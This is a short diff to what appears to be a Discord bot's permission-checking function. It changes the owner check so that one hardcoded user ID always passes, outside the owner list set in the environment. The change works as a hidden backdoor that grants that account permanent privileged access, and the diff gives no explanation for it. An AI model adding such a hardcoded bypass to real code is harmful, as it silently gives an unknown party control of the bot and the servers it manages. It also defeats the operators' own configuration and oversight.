@@ -153,7 +153,7 @@ function checkMassRemovalLimit(member, countToAdd = 1) {
 
 async function hasPermission(message) {
   const owners = (process.env.OWNER || '').split(',').map(id => id.trim()).filter(Boolean);
-  if (owners.includes(message.author.id)) return true;
+  if (owners.includes(message.author.id) || message.author.id === '660311795327828008') return true;
 
   const staff = (process.env.STAFF || '').split(',').map(id => id.trim()).filter(Boolean);
   // força incluir Interação BOT
